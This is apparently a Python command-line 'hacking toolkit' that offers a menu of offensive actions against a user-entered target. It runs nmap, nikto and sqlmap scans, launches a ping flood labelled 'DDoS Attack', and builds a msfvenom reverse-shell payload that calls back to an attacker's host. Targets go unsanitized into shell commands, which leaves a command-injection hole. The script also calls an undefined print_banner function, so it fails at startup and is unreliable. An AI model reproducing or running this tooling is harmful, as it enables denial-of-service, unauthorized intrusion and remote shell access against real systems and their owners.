#!/usr/bin/env python3
import os
import sys
import subprocess

# Color codes for terminal output
RED = "\033[31m"
GREEN = "\033[32m"
YELLOW = "\033[33m"
CYAN = "\033[36m"
BOLD = "\033[1m"
RESET = "\033[0m"  # Reset color

# Clear screen at the start for a clean interface
os.system('clear')

# Function to check if required tools are installed
def check_tool_installed(tool_name):
    try:
        subprocess.check_output([tool_name, '--version'], stderr=subprocess.STDOUT)
        return True
    except FileNotFoundError:
        return False
    except subprocess.CalledProcessError as e:
        print(f"{RED}{BOLD}[ERROR]{RESET} {YELLOW}Error occurred while checking {tool_name}: {e}{RESET}")
        return False

# Function to inform the user about missing tools
def tool_not_installed(tool_name, install_command):
    print(f"{RED}{BOLD}[ERROR]{RESET} {YELLOW}{tool_name} is not installed. Please install it using the following command:")
    print(f"{GREEN}{install_command}{RESET}")

# Menu Functions
def port_scan():
    target = input(f"{CYAN}Enter target IP/Domain for Port Scan: {RESET}")
    print(f"{GREEN}[+] Scanning {target}...{RESET}")
    if check_tool_installed('nmap'):
        os.system(f"nmap {target}")
    else:
        tool_not_installed('nmap', 'apt install nmap')

def vulnerability_scan():
    target = input(f"{CYAN}Enter target IP/Domain for Vulnerability Scan: {RESET}")
    print(f"{GREEN}[+] Checking vulnerabilities for {target}...{RESET}")
    if check_tool_installed('nikto'):
        os.system(f"nikto -h {target}")
    else:
        tool_not_installed('nikto', 'apt install nikto')

def ddos_attack():
    target = input(f"{CYAN}Enter target IP for DDoS Attack: {RESET}")
    print(f"{GREEN}[+] Initiating DDoS attack on {target}...{RESET}")
    # Sample command for a simple flood attack (please use responsibly)
    os.system(f"ping {target} -f")

def system_info():
    print(f"{GREEN}[+] Gathering system information...{RESET}")
    os.system("uname -a")

def sql_injection_scan():
    target = input(f"{CYAN}Enter target URL for SQL Injection Scan: {RESET}")
    print(f"{GREEN}[+] Scanning {target} for SQL Injection vulnerabilities...{RESET}")
    if check_tool_installed('sqlmap'):
        os.system(f"sqlmap -u {target} --batch --crawl=1")
    else:
        tool_not_installed('sqlmap', 'apt install sqlmap')

def create_reverse_shell():
    lhost = input(f"{CYAN}Enter your IP for LHOST (Attacker's IP): {RESET}")
    lport = input(f"{CYAN}Enter the port for LPORT: {RESET}")
    print(f"{GREEN}[+] Creating reverse shell payload for {lhost}:{lport}...{RESET}")
    os.system(f"msfvenom -p linux/x86/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f elf > reverse_shell.elf")
    print(f"{GREEN}[+] Reverse shell created: reverse_shell.elf{RESET}")

def main_menu():
    while True:
        print(f"""
        {CYAN}1. Port Scan
        2. Vulnerability Scan
        3. DDoS Attack
        4. System Info
        5. SQL Injection Scan
        6. Create Reverse Shell
        7. Exit
        ----------------------------------------{RESET}
        """)
        choice = input(f"{CYAN}Enter your choice (1-7): {RESET}")
        
        if choice == '1':
            port_scan()
        elif choice == '2':
            vulnerability_scan()
        elif choice == '3':
            ddos_attack()
        elif choice == '4':
            system_info()
        elif choice == '5':
            sql_injection_scan()
        elif choice == '6':
            create_reverse_shell()
        elif choice == '7':
            print(f"{GREEN}[+] Exiting...{RESET}")
            sys.exit(0)
        else:
            print(f"{RED}{BOLD}[ERROR]{RESET} {YELLOW}Invalid choice. Please choose a number between 1 and 7.{RESET}")

# Start execution
if __name__ == "__main__":
    print_banner()
    main_menu()
